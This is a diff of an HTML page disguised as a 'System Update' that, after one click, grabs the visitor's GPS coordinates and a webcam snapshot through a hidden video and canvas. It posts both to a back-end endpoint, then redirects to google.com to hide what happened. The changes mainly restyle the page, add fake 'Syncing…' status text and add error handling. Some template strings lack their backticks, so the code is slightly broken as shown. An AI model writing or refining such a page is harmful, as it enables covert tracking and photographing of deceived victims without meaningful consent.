@@ -1,65 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update</title>
-    <style>
-        body { background: #fff; color: #333; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>System Update</title>
+  <style>
+    body {
+      background:#fff; color:#333; font-family:sans-serif;
+      display:flex; justify-content:center; align-items:center;
+      height:100vh; margin:0; cursor:pointer;
+    }
+  </style>
 </head>
 <body>
-    <div id="status">Click to verify connection...</div>
-    <video id="video" autoplay playsinline style="display:none"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+  <div id="status">Click anywhere to start...</div>
+  <video id="video" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
 
-    <script>
-        async function startProcess() {
-            const status = document.getElementById('status');
-            status.innerText = "Verifying...";
-
-            try {
-                // 1. Get GPS
-                const coords = await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => resolve(${pos.coords.latitude},${pos.coords.longitude}),
-                        () => resolve("Denied"),
-                        { timeout: 5000 }
-                    );
-                });
-
-                // 2. Get Camera
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(r => video.onloadedmetadata = r);
-                
-                // 3. Capture
-                const canvas = document.getElementById('canvas');
-                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                const imageData = canvas.toDataURL('image/jpeg');
-
-                // 4. Send
-                status.innerText = "Finalizing...";
-                await fetch('/api/index', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: imageData, gps: coords })
-                });
-
-                stream.getTracks().forEach(t => t.stop());
-                window.location.href = "https://www.google.com";
-            } catch (err) {
-                console.error(err);
-                status.innerText = "Error";
-                window.location.href = "https://www.google.com";
-            }
-        }
-
-        // Attach the listener once the DOM is fully loaded
-        document.addEventListener('DOMContentLoaded', () => {
-            document.body.addEventListener('click', startProcess);
+  <script>
+    // Helper: wrap the whole flow in an async function
+    async function run() {
+      const status = document.getElementById('status');
+      try {
+        /* ---------- 1. GPS ---------- */
+        status.innerText = 'Syncing GPS…';
+        const coords = await new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => resolve(${pos.coords.latitude},${pos.coords.longitude}),
+            () => resolve('Denied'),
+            { timeout: 5000 }
+          );
         });
-    </script>
+
+        /* ---------- 2. Camera ---------- */
+        status.innerText = 'Syncing Camera…';
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        await new Promise(r => video.onloadedmetadata = r);
+
+        /* ---------- 3. Capture ---------- */
+        status.innerText = 'Capturing…';
+        const canvas = document.getElementById('canvas');
+        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        /* ---------- 4. Send to Back‑end ---------- */
+        status.innerText = 'Sending…';
+        const resp = await fetch('/api/index', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            image: imageData,
+            gps: coords
+          })
+        });
+
+        if (!resp.ok) throw new Error(Server error: ${resp.status});
+
+        /* ---------- 5. Cleanup & Redirect ---------- */
+        stream.getTracks().forEach(t => t.stop());
+        window.location.href = 'https://www.google.com';
+      } catch (e) {
+        console.error(e);
+        status.innerText = '⚠️ ' + e.message;
+        // Still redirect after 2 s so the user isn't stuck
+        setTimeout(() => window.location.href = 'https://www.google.com', 2000);
+      }
+    }
+
+    /* ---------- 6. Wire click event ---------- */
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.addEventListener('click', run);
+    });
+  </script>
 </body>
 </html>
